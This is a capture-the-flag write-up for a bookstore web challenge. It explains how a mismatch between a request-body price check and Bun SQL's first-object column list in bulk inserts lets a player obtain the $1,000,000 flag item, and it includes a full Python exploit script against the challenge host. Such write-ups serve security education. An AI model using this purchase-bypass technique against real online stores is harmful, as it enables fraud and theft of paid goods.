# bobles-and-narnes

**Category:** web

---

#### Description

This challenge is a simple bookstore web app with a cart. The `Flag` “book” costs `$1000000`, but new accounts only have `$1000`. Checkout returns a ZIP of the purchased files, and the real flag is in `flag.txt`.

#### Solution

The key bug is in `POST /cart/add`:

* The server computes how much to charge using the **request body**:
  * `additionalSum = products.filter(p => !+p.is_sample).map(price).sum()`
  * So setting `is_sample: true` on the flag item makes it *not* counted (no “too poor” rejection).
* But it inserts cart rows using Bun SQL’s object bulk insert:
  * `await db\`INSERT INTO cart\_items ${db(cartEntries)}\`\`
  * When `db([...])` is given an array of objects, the INSERT column list is taken from the **first object** only.
  * If the first object omits `is_sample`, the INSERT omits the `is_sample` column for *all* rows, so every inserted row gets `is_sample = NULL` (even later objects that included `is_sample`).

At checkout:

* `const path = item.is_sample ? samplePath : fullPath`
* `NULL` is falsy, so `item.is_sample` selects the **full** file path (`flag.txt`), giving the real flag.
* The balance can go negative on checkout (no “enough money” check there), so we just need to pass the `/cart/add` check.

Exploit strategy:

1. Add two products in one request:
   * Product 0: any cheap book, **omit** `is_sample` entirely (so the INSERT omits that column).
   * Product 1: the flag book with `is_sample: true` (so the price check skips charging it).
2. Checkout and unzip `flag.txt`.

Solution code (`solve_final.py`):

```python
#!/usr/bin/env python3
import io
import time
import uuid
import zipfile

import requests

BASE = "https://bobles-and-narnes.chall.lac.tf"

FLAG_BOOK_ID = "2a16e349fb9045fa"
CHEAP_BOOK_ID = "509d8c2a80e495fb"  # $20


def _post(session: requests.Session, path: str, *, json=None, data=None, timeout=20):
    return session.post(f"{BASE}{path}", json=json, data=data, allow_redirects=False, timeout=timeout)


def attempt_once() -> str:
    s = requests.Session()
    username = "u" + uuid.uuid4().hex[:10]
    password = "p" + uuid.uuid4().hex[:10]

    r = _post(s, "/register", data={"username": username, "password": password})
    if r.status_code >= 500:
        raise RuntimeError(f"register backend error: {r.status_code} {r.text[:80]}")
    if r.status_code not in (302, 303):
        raise RuntimeError(f"register failed: {r.status_code} {r.text[:200]}")

    payload = {"products": [{"book_id": CHEAP_BOOK_ID}, {"book_id": FLAG_BOOK_ID, "is_sample": True}]}
    r = _post(s, "/cart/add", json=payload)
    if r.status_code != 200:
        raise RuntimeError(f"add failed: {r.status_code} {r.text[:200]}")
    j = r.json()
    if j.get("err"):
        raise RuntimeError(f"add rejected: {j['err']}")

    r = _post(s, "/cart/checkout", data={})
    if r.status_code != 200:
        raise RuntimeError(f"checkout failed: {r.status_code} {r.text[:200]}")
    if "application/zip" not in (r.headers.get("content-type") or ""):
        raise RuntimeError(f"unexpected content-type: {r.headers.get('content-type')}")

    with zipfile.ZipFile(io.BytesIO(r.content)) as zf:
        return zf.read("flag.txt").decode(errors="replace").strip()


def main():
    for i in range(60):
        try:
            print(attempt_once())
            return 0
        except Exception:
            time.sleep(min(2.0, 0.1 * (i + 1)))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```
